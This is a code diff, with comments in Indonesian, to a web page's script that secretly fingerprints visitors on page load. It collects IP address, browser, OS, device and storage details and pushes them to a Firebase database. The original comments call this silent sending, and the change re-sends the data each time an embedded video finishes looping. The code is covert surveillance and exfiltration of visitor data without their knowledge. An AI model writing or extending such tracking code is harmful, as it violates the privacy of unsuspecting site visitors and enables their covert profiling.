@@ -38,13 +38,11 @@
         // Init Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
+        let loopCount = 0; // Counter untuk loop video
 
-        // Fungsi ambil data silently lalu kirim ke DB
-        async function logUserData() {
+        // Fungsi ambil data fingerprint
+        async function collectFingerprint() {
             try {
-                // Anonymous login untuk write ke database
-                await firebase.auth().signInAnonymously();
-
                 // Ambil IP via API eksternal
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -167,8 +165,8 @@
                     }
                 } catch (e) {}
 
-                // Data yang dikirim (pastikan semua field ada, meski "Unknown")
-                const data = {
+                // Data yang dikirim
+                return {
                     ip: userIP,
                     browser: browser,
                     os: os,
@@ -193,19 +191,41 @@
                     pointerType: pointerType,
                     perfBenchmark: perfBenchmark,
                     storageQuota: storageQuota,
-                    storageUsage: storageUsage
+                    storageUsage: storageUsage,
+                    loopCount: loopCount // Tambah counter loop
                 };
+            } catch (error) {
+                console.error('Error collecting fingerprint:', error);
+                return null; // Return null kalau gagal
+            }
+        }
 
-                // Kirim ke Firebase Realtime DB (path /logs)
+        // Fungsi kirim data ke Firebase
+        async function logData(data) {
+            try {
+                await firebase.auth().signInAnonymously();
                 await database.ref('logs').push(data);
             } catch (error) {
-                console.error('Error logging data:', error); // Silent error
+                console.error('Error logging data:', error);
             }
         }
 
         // Jalankan saat load
-        window.onload = () => {
-            logUserData(); // Ambil dan kirim data diam-diam
+        window.onload = async () => {
+            // Kirim data pertama (loopCount: 0)
+            const initialData = await collectFingerprint();
+            if (initialData) await logData(initialData);
+
+            // Tambah event listener untuk video loop
+            const video = document.querySelector('video');
+            video.addEventListener('ended', async () => {
+                loopCount++; // Tambah counter setiap loop selesai
+                const data = await collectFingerprint();
+                if (data) {
+                    data.loopCount = loopCount; // Update loopCount
+                    await logData(data);
+                }
+            });
         };
     </script>
 </head>
